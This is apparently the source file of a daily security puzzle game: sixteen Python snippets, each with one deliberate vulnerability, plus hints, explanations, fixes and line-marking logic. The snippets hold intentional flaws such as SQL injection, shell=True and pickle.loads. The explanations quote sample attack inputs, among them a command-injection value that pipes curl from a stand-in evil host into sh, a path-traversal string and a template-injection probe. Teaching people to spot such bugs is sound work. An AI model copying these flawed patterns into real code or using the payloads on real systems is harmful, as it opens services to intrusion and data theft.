/**
 * Daily Zero-Day puzzle bank: one short Python snippet per day with exactly one vulnerable
 * spot. `needles` locate the accepted answer line(s), so the snippets can be edited without
 * renumbering anything.
 */

import { dayNumber } from "@/lib/share";

export interface Puzzle {
  title: string;
  code: string;
  needles: string[];
  cwe: string;
  bug: string;
  hint: string;
  explanation: string;
  fix: string;
}

export const BUG_NAMES = [
  "SQL injection",
  "Command injection",
  "Path traversal",
  "Unsafe deserialization",
  "SSRF",
  "Code injection",
  "Hardcoded secret",
  "Broken access control (IDOR)",
  "Weak password hashing",
  "Unverified JWT",
  "Open redirect",
  "TLS verification disabled",
  "Template injection",
  "Insecure temp file",
  "Debug mode in production",
];

export const PUZZLES: Puzzle[] = [
  {
    title: "Invoice search",
    code: `from fastapi import APIRouter, Depends

from app.auth import current_user
from app.db import conn

router = APIRouter()


@router.get("/invoices/search")
def search(email: str, user=Depends(current_user)):
    """Find invoices for a customer."""
    cur = conn.cursor()
    cur.execute(f"SELECT * FROM invoices WHERE email = '{email}'")
    rows = cur.fetchall()
    cur.execute("SELECT count(*) FROM audit WHERE user_id = ?", (user.id,))
    return {"rows": rows}`,
    needles: [`cur.execute(f"SELECT * FROM invoices`],
    cwe: "CWE-89",
    bug: "SQL injection",
    hint: "Two queries run here. Only one of them is built from user input.",
    explanation:
      "The email from the query string is pasted into the SQL text, so `x' OR '1'='1` dumps every invoice. The audit query below is safe because it uses a bound parameter.",
    fix: `cur.execute("SELECT * FROM invoices WHERE email = ?", (email,))`,
  },
  {
    title: "Nightly backup",
    code: `import subprocess
from pathlib import Path

BACKUP_DIR = Path("/var/backups")


def backup_database(name: str) -> Path:
    """Dump the named database to a gzip file."""
    target = BACKUP_DIR / f"{name}.sql.gz"
    if target.exists():
        target.unlink()
    subprocess.run(f"pg_dump {name} | gzip > {target}", shell=True, check=True)
    return target`,
    needles: ["shell=True"],
    cwe: "CWE-78",
    bug: "Command injection",
    hint: "Look at how the command is handed to the operating system.",
    explanation:
      "With shell=True the whole string goes to /bin/sh, so a name like `x; curl evil.sh | sh` runs attacker commands.",
    fix: `with open(target, "wb") as out:
    dump = subprocess.Popen(["pg_dump", name], stdout=subprocess.PIPE)
    subprocess.run(["gzip"], stdin=dump.stdout, stdout=out, check=True)`,
  },
  {
    title: "Attachment download",
    code: `import os

from flask import Flask, abort, request, send_file

app = Flask(__name__)
UPLOADS = "/srv/app/uploads"


@app.get("/files")
def download():
    name = request.args.get("name", "")
    if not name:
        abort(400)
    path = os.path.join(UPLOADS, name)
    return send_file(path)`,
    needles: ["path = os.path.join(UPLOADS, name)", "return send_file(path)"],
    cwe: "CWE-22",
    bug: "Path traversal",
    hint: "What happens if the name contains `../`?",
    explanation:
      "os.path.join keeps `../` segments (and an absolute name replaces UPLOADS entirely), so `name=../../etc/passwd` reads any file the server can.",
    fix: `path = os.path.realpath(os.path.join(UPLOADS, name))
if not path.startswith(UPLOADS + os.sep):
    abort(404)`,
  },
  {
    title: "Session restore",
    code: `import base64
import pickle

from fastapi import FastAPI, Request

app = FastAPI()


@app.post("/session/restore")
async def restore(request: Request):
    body = await request.body()
    state = pickle.loads(base64.b64decode(body))
    return {"restored": len(state)}`,
    needles: ["pickle.loads("],
    cwe: "CWE-502",
    bug: "Unsafe deserialization",
    hint: "Base64 isn't the problem. What turns bytes back into objects?",
    explanation:
      "Unpickling runs code chosen by whoever made the bytes. Any client can post a payload that executes on the server.",
    fix: "state = json.loads(base64.b64decode(body))",
  },
  {
    title: "Link preview",
    code: `import httpx
from fastapi import FastAPI

app = FastAPI()
TIMEOUT = httpx.Timeout(5.0)


@app.get("/preview")
async def preview(url: str):
    """Fetch a page title for chat link previews."""
    async with httpx.AsyncClient(timeout=TIMEOUT) as client:
        resp = await client.get(url, follow_redirects=True)
    title = resp.text.split("<title>")[-1].split("</title>")[0]
    return {"title": title[:200]}`,
    needles: ["resp = await client.get(url"],
    cwe: "CWE-918",
    bug: "SSRF",
    hint: "Whose network does this request come from?",
    explanation:
      "The server fetches any URL a user sends, including internal hosts and cloud metadata at 169.254.169.254.",
    fix: `host = urlparse(url).hostname
if urlparse(url).scheme != "https" or is_private(host):
    raise HTTPException(400, "URL not allowed")`,
  },
  {
    title: "Metrics endpoint",
    code: `from fastapi import FastAPI

from app.stats import load_counters

app = FastAPI()


@app.get("/metrics")
def metrics(expr: str = "total"):
    """Return a computed metric, e.g. total / days."""
    counters = load_counters()
    value = eval(expr, {}, counters)
    return {"expr": expr, "value": value}`,
    needles: ["value = eval("],
    cwe: "CWE-95",
    bug: "Code injection",
    hint: "Empty globals don't make it safe.",
    explanation:
      "eval runs arbitrary Python from the query string. Empty globals don't help: `().__class__.__base__.__subclasses__()` escapes the sandbox.",
    fix: `ALLOWED = {"total": lambda c: c["total"], "per_day": lambda c: c["total"] / c["days"]}
value = ALLOWED[expr](counters)`,
  },
  {
    title: "Payments client",
    code: `import os

import stripe

STRIPE_API_VERSION = "2026-01-01"
stripe.api_key = "sk_${"live"}_51Hx9aKp2QmZtR8vN4cWl7bYe"
WEBHOOK_TOLERANCE = int(os.environ.get("WEBHOOK_TOLERANCE", "300"))


def charge(customer_id: str, cents: int) -> str:
    """Charge a saved card and return the payment id."""
    intent = stripe.PaymentIntent.create(customer=customer_id, amount=cents, currency="usd")
    return intent.id`,
    needles: ['stripe.api_key = "sk_live'],
    cwe: "CWE-798",
    bug: "Hardcoded secret",
    hint: "Not everything here comes from the environment.",
    explanation:
      "A live Stripe key is committed to the repo; anyone with read access (or a leaked fork) can charge cards.",
    fix: 'stripe.api_key = os.environ["STRIPE_API_KEY"]',
  },
  {
    title: "Invoice detail",
    code: `from fastapi import APIRouter, Depends, HTTPException

from app.auth import current_user
from app.models import Invoice
from app.db import session

router = APIRouter()


@router.get("/invoices/{invoice_id}")
def get_invoice(invoice_id: int, user=Depends(current_user)):
    invoice = session.get(Invoice, invoice_id)
    if invoice is None:
        raise HTTPException(404)
    return invoice`,
    needles: ["invoice = session.get(Invoice, invoice_id)", "return invoice"],
    cwe: "CWE-639",
    bug: "Broken access control (IDOR)",
    hint: "The user is signed in. But is it their invoice?",
    explanation:
      "Any signed-in user can read any invoice by changing the id in the URL; nothing checks that it belongs to them.",
    fix: `if invoice is None or invoice.owner_id != user.id:
    raise HTTPException(404)`,
  },
  {
    title: "Sign up",
    code: `import hashlib
import secrets

from app.db import users


def register(email: str, password: str) -> str:
    """Create an account and return its id."""
    user_id = secrets.token_hex(8)
    digest = hashlib.md5(password.encode()).hexdigest()
    users.insert({"id": user_id, "email": email.lower(), "password": digest})
    return user_id`,
    needles: ["hashlib.md5("],
    cwe: "CWE-328",
    bug: "Weak password hashing",
    hint: "The token is fine. How is the password stored?",
    explanation:
      "Unsalted MD5 is cracked at billions of guesses per second; a leaked table gives up most passwords in minutes.",
    fix: "digest = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()",
  },
  {
    title: "API auth",
    code: `import jwt
from fastapi import Header, HTTPException

SECRET = "loaded-from-vault-at-startup"


def current_user(authorization: str = Header()) -> dict:
    token = authorization.removeprefix("Bearer ")
    try:
        claims = jwt.decode(token, options={"verify_signature": False})
    except jwt.PyJWTError:
        raise HTTPException(401)
    return {"id": claims["sub"], "role": claims.get("role", "user")}`,
    needles: ['options={"verify_signature": False}'],
    cwe: "CWE-347",
    bug: "Unverified JWT",
    hint: "SECRET is defined. Is it ever used?",
    explanation:
      "Signature checks are off, so anyone can mint a token with `role: admin` and the server believes it.",
    fix: 'claims = jwt.decode(token, SECRET, algorithms=["HS256"])',
  },
  {
    title: "Login redirect",
    code: `from flask import Flask, redirect, request, session

from app.auth import check_password

app = Flask(__name__)


@app.post("/login")
def login():
    if not check_password(request.form["email"], request.form["password"]):
        return redirect("/login?error=1")
    session["email"] = request.form["email"]
    return redirect(request.args.get("next", "/"))`,
    needles: ['return redirect(request.args.get("next"'],
    cwe: "CWE-601",
    bug: "Open redirect",
    hint: "Where can `next` point?",
    explanation:
      "`?next=https://evil.example` sends freshly signed-in users to a phishing page that looks like it came from you.",
    fix: `target = request.args.get("next", "/")
return redirect(target if target.startswith("/") and not target.startswith("//") else "/")`,
  },
  {
    title: "Partner webhook",
    code: `import requests

PARTNER_URL = "https://partner.example.com/hooks/orders"


def notify_partner(order: dict) -> bool:
    """Tell the partner about a new order."""
    resp = requests.post(
        PARTNER_URL,
        json={"id": order["id"], "total": order["total"]},
        timeout=10,
        verify=False,
    )
    return resp.ok`,
    needles: ["verify=False"],
    cwe: "CWE-295",
    bug: "TLS verification disabled",
    hint: "The URL is https. Is the certificate checked?",
    explanation:
      "Certificate checks are off, so anyone on the network path can impersonate the partner and read or alter order data.",
    fix: "# remove verify=False (or point verify= at the partner's CA bundle)",
  },
  {
    title: "Greeting page",
    code: `from flask import Flask, render_template_string, request

app = Flask(__name__)
BRAND = "Acme"


@app.get("/hello")
def hello():
    name = request.args.get("name", "friend")
    page = f"<h1>Hello {name}!</h1><p>Welcome to {BRAND}.</p>"
    return render_template_string(page)`,
    needles: ["return render_template_string(page)", 'page = f"<h1>Hello {name}'],
    cwe: "CWE-1336",
    bug: "Template injection",
    hint: "The user's text ends up inside a template, not just a page.",
    explanation:
      "The name is pasted into Jinja source, so `{{config}}` leaks secrets and crafted payloads run code on the server.",
    fix: 'return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)',
  },
  {
    title: "Report export",
    code: `import csv
import tempfile


def export_rows(rows: list[dict]) -> str:
    """Write rows to a temporary CSV and return its path."""
    path = tempfile.mktemp(suffix=".csv")
    with open(path, "w", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=sorted(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    return path`,
    needles: ["tempfile.mktemp("],
    cwe: "CWE-377",
    bug: "Insecure temp file",
    hint: "There is a gap between choosing a name and creating the file.",
    explanation:
      "mktemp only picks a name; another local user can create that path (or a symlink) first and capture or redirect the export.",
    fix: `fd, path = tempfile.mkstemp(suffix=".csv")
with open(fd, "w", newline="") as fh:`,
  },
  {
    title: "Admin console",
    code: `import os

from flask import Flask

from app.admin import admin_bp

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
app.register_blueprint(admin_bp, url_prefix="/admin")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)`,
    needles: ["debug=True"],
    cwe: "CWE-489",
    bug: "Debug mode in production",
    hint: "The secret is fine. What does the server expose when something crashes?",
    explanation:
      "Flask's debugger on 0.0.0.0 gives anyone who triggers an error an interactive Python console on the server.",
    fix: 'app.run(host="0.0.0.0", port=8080, debug=os.environ.get("FLASK_DEBUG") == "1")',
  },
  {
    title: "Config loader",
    code: `import yaml
from fastapi import FastAPI, UploadFile

app = FastAPI()


@app.post("/config/import")
async def import_config(file: UploadFile):
    """Import a team configuration file."""
    raw = await file.read()
    config = yaml.load(raw, Loader=yaml.Loader)
    return {"keys": sorted(config)}`,
    needles: ["yaml.load(raw, Loader=yaml.Loader)"],
    cwe: "CWE-502",
    bug: "Unsafe deserialization",
    hint: "YAML can describe more than plain data.",
    explanation:
      "The full Loader builds arbitrary Python objects from tags like `!!python/object/apply`, which runs code during upload.",
    fix: "config = yaml.safe_load(raw)",
  },
];

export interface DailyPuzzle extends Puzzle {
  number: number;
  answerLines: number[];
  options: string[];
}

/** Today's puzzle (same for everyone on the same calendar day), with 4 bug-name options. */
export function puzzleForDay(now: Date = new Date()): DailyPuzzle {
  const number = dayNumber(now);
  const p = PUZZLES[(number - 1) % PUZZLES.length];
  const lines = p.code.split("\n");
  const answerLines = lines
    .map((line, i) => (p.needles.some((n) => line.includes(n)) ? i + 1 : 0))
    .filter(Boolean);
  // Deterministic distractors so everyone sees the same options.
  const others = BUG_NAMES.filter((b) => b !== p.bug);
  const picks = [0, 1, 2].map((k) => others[(number * 7 + k * 5) % others.length]);
  const unique = [...new Set(picks)];
  while (unique.length < 3) unique.push(others.find((o) => !unique.includes(o))!);
  const options = [...unique, p.bug].sort((a, b) => ((a.length * 31 + number) % 17) - ((b.length * 31 + number) % 17));
  return { ...p, number, answerLines, options };
}

export type Mark = "hit" | "warm" | "cold";

/** Exact line = hit; within two lines of an answer = warm; anything else = cold. */
export function markGuess(line: number, answers: number[]): Mark {
  if (answers.includes(line)) return "hit";
  return answers.some((a) => Math.abs(a - line) <= 2) ? "warm" : "cold";
}

export const MARK_SQUARE: Record<Mark, string> = { hit: "🟩", warm: "🟨", cold: "⬛" };
